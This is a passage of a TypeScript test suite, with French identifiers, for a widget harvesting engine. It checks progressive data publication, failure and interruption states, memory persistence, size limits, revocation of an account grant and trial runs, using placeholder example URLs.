    const fin = new Promise<number | null>((ok) => {
      tuer = () => ok(null);
      void (async () => {
        for (const p of pas) {
          await new Promise((r) => setImmediate(r));
          if (typeof p === "function") await p();
          else stdout.write(typeof p === "string" ? p : JSON.stringify(p) + "\n");
        }
        await new Promise((r) => setImmediate(r));
        if (o.bloque) return;
        stdout.end();
        stderr.end();
        setImmediate(() => ok(0));
      })().catch(() => {
        // A probe failed: the container stops right away (the test fails on what the probe did not see).
        stdout.end();
        stderr.end();
        ok(1);
      });
    });
    return { stdin, stdout, stderr, tuer: () => tuer(), fin };
  };

  /** A clock that the steps make advance. */
  const horlogeMobile = () => {
    let t = MAINTENANT.getTime();
    return { horloge: () => new Date(t), avancer: (ms: number) => () => void (t += ms) };
  };
  const debutBloc = (id: string) => ({ t: "bloc", id, etape: "debut" });
  const finBloc = (id: string, sortie: unknown) => ({ t: "bloc", id, etape: "fin", statut: "reussi", sortie });
  const pub = (donnees: unknown, faits: number, total: number) => ({ t: "publication", donnees, faits, total });
  const mem = (valeur: unknown) => ({ t: "memoire", memoire: { liste: { type: "code", valeur } } });
  const A1 = { url: "https://a.example/1" };
  const A2 = { url: "https://a.example/2" };
  const A3 = { url: "https://a.example/3" };
  /** The start of a watch() run up to the opening of the chain (record). */
  const avantChaine = (liste: unknown[]) => [debutBloc("liste"), finBloc("liste", liste), debutBloc("fiche")];
  /** Waits until `f` is true (relays are written in the background). */
  async function attendre(f: () => Promise<boolean>): Promise<void> {
    for (let i = 0; i < 200; i++) {
      if (await f()) return;
      await new Promise((r) => setTimeout(r, 10));
    }
    throw new Error("attente trop longue");
  }
  const progressionVaut = (ctx: Contexte, faits: number) => async () =>
    (await lireEtatWidget(ctx.dossierWidgets, ctx.widget.id)).progression?.faits === faits;
  const DERNIERE_MAJ = "2026-10-27T08:00:00.000Z";
  async function etatAvant(ctx: Contexte) {
    await ecrireEtatWidget(ctx.dossierWidgets, ctx.widget.id, { statut: "ok", derniereMaj: DERNIERE_MAJ, derniereTentative: DERNIERE_MAJ });
  }

  it("two publications write data and in-progress state with progress; the end writes the final result and removes the progress", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true });
    await etatAvant(ctx);
    const { horloge: h, avancer } = horlogeMobile();
    const vus: unknown[] = [];
    const sonde = (faits: number) => async () => {
      await attendre(progressionVaut(ctx, faits));
      vus.push({ etat: await lireEtatWidget(ctx.dossierWidgets, "veille"), donnees: await lireJson(fichierDonnees(ctx)) });
    };
    let changes = 0;
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      surChange: () => void changes++,
      lancer: lanceurPas(ctx, [
        ...avantChaine([A1, A2]),
        mem(["1"]),
        pub([A1], 1, 2),
        sonde(1),
        avancer(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 2),
        sonde(2),
        finBloc("fiche", [A1, A2]),
        debutBloc("sortie"),
        finBloc("sortie", [A1, A2]),
        { t: "fin", donnees: { final: [A1, A2] } },
      ]),
    });
    expect(vus).toEqual([
      {
        etat: { statut: "en-cours", derniereMaj: DERNIERE_MAJ, derniereTentative: MAINTENANT.toISOString(), progression: { faits: 1, total: 2 }, avant: { statut: "ok" } },
        donnees: [A1],
      },
      {
        etat: { statut: "en-cours", derniereMaj: DERNIERE_MAJ, derniereTentative: MAINTENANT.toISOString(), progression: { faits: 2, total: 2 }, avant: { statut: "ok" } },
        donnees: [A1, A2],
      },
    ]);
    // Start, two publications, end.
    expect(changes).toBe(4);
    expect(r.etat.statut).toBe("ok");
    expect(r.donnees).toEqual({ final: [A1, A2] });
    expect(await lireJson(fichierDonnees(ctx))).toEqual({ final: [A1, A2] });
    const etat = await lireEtatWidget(ctx.dossierWidgets, "veille");
    expect(etat.statut).toBe("ok");
    expect(etat.progression).toBeUndefined();
    // The earlier state, kept during the run, does not survive its end.
    expect("avant" in etat).toBe(false);
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1", "2"]);
  });

  it("failure after two publications: the last one stays, error state, the run's memory kept", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    await etatAvant(ctx);
    await ecrireDonnees(ctx.dossierWidgets, "veille", { ancien: true });
    await ecrireMemoire(donneesDe(ctx), { liste: { type: "code", valeur: ["ancienne"] } });
    const { horloge: h, avancer } = horlogeMobile();
    const recu: string[] = [];
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(
        ctx,
        [...avantChaine([A1, A2, A3]), mem(["1"]), pub([A1], 1, 3), avancer(5000), mem(["1", "2"]), pub([A1, A2], 2, 3), { t: "journal", bloc: "fiche", texte: "x" }, { t: "echec", erreur: "cassé" }],
        { recu },
      ),
    });
    // The maximum duration is passed: limit sent, progressive run, container stopped at 30 min + 30 s.
    expect(JSON.parse(recu.join("").split("\n")[0]!)).toMatchObject({ limiteMs: 1_800_000, progressif: true });
    expect(ctx.commandes[0]!.slice(ctx.commandes[0]!.indexOf("timeout"), ctx.commandes[0]!.indexOf("timeout") + 4)).toEqual(["timeout", "-k", "5", "1830"]);
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "cassé", derniereMaj: DERNIERE_MAJ });
    expect(r.etat.progression).toBeUndefined();
    expect(await lireJson(fichierDonnees(ctx))).toEqual([A1, A2]);
    const etat = await lireEtatWidget(ctx.dossierWidgets, "veille");
    expect(etat).toMatchObject({ statut: "erreur", derniereMaj: DERNIERE_MAJ });
    expect(etat.progression).toBeUndefined();
    // The last safe memory (not only the one relayed along the way, the first).
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1", "2"]);
    expect((await lireExecution(donneesDe(ctx), r.execution!))?.statut).toBe("echouee");
  });

  it("F3: a publication never overwrites a state that is no longer in-progress (accord-requis written in the meantime)", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true });
    await etatAvant(ctx);
    const { horloge: h } = horlogeMobile();
    let vu: unknown;
    await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(ctx, [
        ...avantChaine([A1, A2]),
        // What refuserAccord writes during the run.
        () => ecrireEtatWidget(ctx.dossierWidgets, "veille", { statut: "accord-requis", derniereMaj: DERNIERE_MAJ, derniereTentative: DERNIERE_MAJ }),
        mem(["1"]),
        pub([A1], 1, 2),
        async () => {
          await attendre(async () => existsSync(fichierDonnees(ctx)));
          await new Promise((ok) => setTimeout(ok, 50));
          vu = (await lireEtatWidget(ctx.dossierWidgets, "veille")).statut;
        },
        { t: "echec", erreur: "cassé" },
      ]),
    });
    expect(vu).toBe("accord-requis");
  });

  it("final data over 2 MB: memoire.json stays the last memory relayed before the exit", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    await etatAvant(ctx);
    const { horloge: h, avancer } = horlogeMobile();
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(ctx, [
        ...avantChaine([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        avancer(40_000),
        finBloc("fiche", [A1, A2, A3]),
        debutBloc("sortie"),
        finBloc("sortie", [A1, A2, A3]),
        // Retains the keys of 2 and 3, which only the final output shows: it is refused.
        mem(["1", "2", "3"]),
        { t: "fin", donnees: "x".repeat(2 * 1024 * 1024 + 10) },
      ]),
    });
    expect(r.etat).toMatchObject({ statut: "erreur", erreur: "Données trop grosses (2 Mo au plus)" });
    expect(await lireJson(fichierDonnees(ctx))).toEqual([A1]);
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1"]);
  });

  it("interrupted after a publication: published data and memory kept, run interrupted", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true });
    const { horloge: h, avancer } = horlogeMobile();
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      delaiMs: 500,
      interrompue: () => true,
      lancer: lanceurPas(ctx, [...avantChaine([A1, A2]), mem(["0"]), pub([], 0, 2), avancer(5000), mem(["1"]), pub([A1], 1, 2), { t: "journal", bloc: "fiche", texte: "x" }], { bloque: true }),
    });
    expect(r.etat.statut).toBe("erreur");
    expect(await lireJson(fichierDonnees(ctx))).toEqual([A1]);
    expect((await lireMemoire(donneesDe(ctx))).liste?.valeur).toEqual(["1"]);
    expect((await lireExecution(donneesDe(ctx), r.execution!))?.statut).toBe("interrompue");
  });

  it("widget without the new fields failing: memory not written (as before)", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx);
    await ecrireMemoire(donneesDe(ctx), { liste: { type: "code", valeur: ["ancienne"] } });
    const avant = await readFile(fichierMemoire(ctx), "utf8");
    const r = await executerRecolte({
      ...optionsDe(ctx),
      lancer: lanceurPas(ctx, [debutBloc("liste"), mem(["1"]), finBloc("liste", [A1]), debutBloc("fiche"), { t: "echec", erreur: "cassé" }]),
    });
    expect(r.etat.statut).toBe("erreur");
    expect(await readFile(fichierMemoire(ctx), "utf8")).toBe(avant);
  });

  it("widget with an account and auFilDeLEau: grant removed between two publications → data erased, accord-requis, nothing written anymore", async () => {
    const ctx = await preparer("veille", "", { compte: ["app.daily.dev"], publiques: ["127.0.0.1"] });
    await enVeille(ctx, { auFilDeLEau: true });
    await accorder(ctx.dossierWidgets, "veille", { domaines: ["app.daily.dev"], publiques: ["127.0.0.1"], profil: "perso" });
    const { horloge: h, avancer } = horlogeMobile();
    const vus: unknown[] = [];
    const r = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(ctx, [
        ...avantChaine([A1, A2, A3]),
        mem(["1"]),
        pub([A1], 1, 3),
        async () => {
          await attendre(progressionVaut(ctx, 1));
          // What refuserAccord does, without the erasing: only the removal is seen by the run.
          await retirerAccord(ctx.dossierWidgets, "veille");
        },
        avancer(5000),
        mem(["1", "2"]),
        pub([A1, A2], 2, 3),
        avancer(5000),
        mem(["1", "2", "3"]),
        pub([A1, A2, A3], 3, 3),
        async () => {
          await new Promise((t) => setTimeout(t, 150));
          vus.push({
            donnees: existsSync(fichierDonnees(ctx)),
            memoire: existsSync(fichierMemoire(ctx)),
            progression: (await lireEtatWidget(ctx.dossierWidgets, "veille")).progression,
          });
        },
        finBloc("fiche", [A1, A2, A3]),
        debutBloc("sortie"),
        finBloc("sortie", [A1, A2, A3]),
        { t: "fin", donnees: [A1, A2, A3] },
      ]),
    });
    // After the removal, neither data nor memory, and the state no longer shows any publication.
    expect(vus).toEqual([{ donnees: false, memoire: false, progression: { faits: 1, total: 3 } }]);
    expect(r.etat).toMatchObject({ statut: "accord-requis", erreurNoyau: true });
    expect(r.donnees).toBeUndefined();
    expect(existsSync(fichierDonnees(ctx))).toBe(false);
    expect(existsSync(fichierMemoire(ctx))).toBe(false);
    expect(await listerExecutions(donneesDe(ctx))).toEqual([]);
    expect((await lireEtatWidget(ctx.dossierWidgets, "veille")).statut).toBe("accord-requis");
  });

  it("a trial of an auFilDeLEau widget writes neither data nor state (nor memory), even with dureeMaxMinutes; limiteMs sent, never progressive", async () => {
    const ctx = await preparer("veille", "");
    await enVeille(ctx, { auFilDeLEau: true, dureeMaxMinutes: 30 });
    const { horloge: h, avancer } = horlogeMobile();
    const reel = await executerRecolte({
      ...optionsDe(ctx),
      horloge: h,
      lancer: lanceurPas(ctx, [...avantChaine([A1]), mem(["1"]), pub([A1], 1, 1), finBloc("fiche", [A1]), debutBloc("sortie"), finBloc("sortie", [A1]), { t: "fin", donnees: [A1] }]),
    });
    expect(reel.etat.statut).toBe("ok");
    const instantane = async () => {
      const r: Record<string, { texte: string; mtime: number } | null> = {};
      for (const nom of ["donnees.json", "memoire.json", "etat.json"]) {
        const chemin = join(donneesDe(ctx), nom);
        r[nom] = existsSync(chemin) ? { texte: await readFile(chemin, "utf8"), mtime: (await stat(chemin)).mtimeMs } : null;
      }
      return r;
    };
    const avant = await instantane();
    expect(Object.values(avant).every((f) => f !== null)).toBe(true);
    const recu: string[] = [];
    avancer(60_000)();
    const r = await executerEssai({
      ...optionsDe(ctx),
      horloge: h,
      origine: reel.execution!,
      depart: "fiche",
      lancer: lanceurPas(
        ctx,
        [debutBloc("fiche"), mem(["2"]), pub([A2], 1, 1), avancer(5000), mem(["3"]), pub([A3], 1, 1), finBloc("fiche", [A2]), debutBloc("sortie"), finBloc("sortie", [A2]), { t: "fin", donnees: [A2] }],
        { recu },
      ),
    });
    expect(r).toMatchObject({ ok: true, statut: "reussie" });
    const debut = JSON.parse(recu.join("").split("\n")[0]!);
    expect(debut.limiteMs).toBe(1_800_000);
    expect(debut.progressif).toBeUndefined();
    expect(await instantane()).toEqual(avant);
  });

  it("web: the search starts from urlRecherche, through the given throttle", async () => {
    const BASE = "https://ddg.test/html/";
    const html = `<div class="result"><a class="result__a" href="https://a.example/1">Titre</a><a class="result__snippet">Extrait</a></div>`;
    const ctx = await preparer("veille", `export default async (w) => w.chercherWeb("clio", { nombre: 1 });`);
    ctx.widget.declaration.sources.web = true;
    const menagement = new Menagement({ attendre: async () => {} });
    const rechercher = vi.spyOn(menagement, "rechercher");
    const pont = new PontFactice([], { actif: null, autoriser: false, lecture: { pages: [], html: { [urlRecherche("clio", BASE)]: html } } });
    const r = await executerRecolte({ ...optionsDe(ctx), pont, menagement, urlRecherche: BASE });
    expect(r.donnees).toEqual([{ titre: "Titre", url: "https://a.example/1", extrait: "Extrait" }]);
    expect(rechercher).toHaveBeenCalledTimes(1);
  });

  it("new ones: 3 listings of which 1 already in the previous data → 2; widget without notifier → absent", async () => {
    const code = `export default async () => [{ url: "https://a.example/1", prix: 12 }, { url: "https://a.example/2" }, { url: "https://a.example/3" }];`;
    const ctx = await preparer("annonces", code);
    ctx.widget.declaration.recolte = { minutes: 60, notifier: true };
    await ecrireDonnees(ctx.dossierWidgets, "annonces", [{ url: "https://a.example/1", prix: 10 }]);
    const r = await executerRecolte(optionsDe(ctx));
    expect(r.etat.statut).toBe("ok");
    expect(r.nouveaux).toBe(2);

    const sans = await preparer("annonces", code);
    await ecrireDonnees(sans.dossierWidgets, "annonces", [{ url: "https://a.example/1", prix: 10 }]);
    const r2 = await executerRecolte(optionsDe(sans));
    expect(r2.etat.statut).toBe("ok");
    expect(r2).not.toHaveProperty("nouveaux");
  });
});
